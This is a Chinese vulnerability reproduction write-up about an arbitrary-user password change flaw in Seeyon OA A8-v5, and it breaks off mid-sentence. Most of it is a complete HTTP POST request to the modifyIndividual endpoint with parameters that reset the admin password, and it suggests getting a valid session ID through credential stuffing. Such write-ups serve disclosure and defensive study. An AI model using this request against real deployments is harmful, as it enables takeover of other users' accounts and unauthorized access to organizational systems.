致远OA A8-v5 任意用户密码修改
=============================

一、漏洞简介
------------

致远A8-V5在设计时存在逻辑错误，在上一步对原始密码进行验证后，下一步不再检测原始密码，从而直接修改用户密码，导致平行权限的越权漏洞。

二、漏洞影响
------------

致远OA A8-v5

三、复现过程
------------

POST如下数据

    POST /seeyon/individualManager.do?method=modifyIndividual HTTP/1.0

    Accept: text/html, application/xhtml+xml, */*

    Referer: http://www.0-sec.org/seeyon/individualManager.do?method=managerFrame

    Accept-Language: zh-CN

    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko

    Content-Type: application/x-www-form-urlencoded

    Proxy-Connection: Keep-Alive

    Pragma: no-cache

    Content-Length: 86

    DNT: 1

    Host: www.0-sec.org

    Cookie: JSESSIONID=DA71A65B3AAD45823A1FADAB80A3E685; Hm_lvt_49c0fa7f96aa0a5fb95c62909d5190a6=1419221849,1419232608; avatarImageUrl=8469117046183055270; loginPageURL="/main.do"



    individualName=admin&formerpassword=123456&nowpassword=wy123456&validatepass=wy123456

individualName为用户名

注意，此处需要以一个合法的JSESSIONID发送如上数据即可修改任意用户密码，合法的JSESSIONID由撞库得出。

本次证明演示中修改的用户为admin，修改
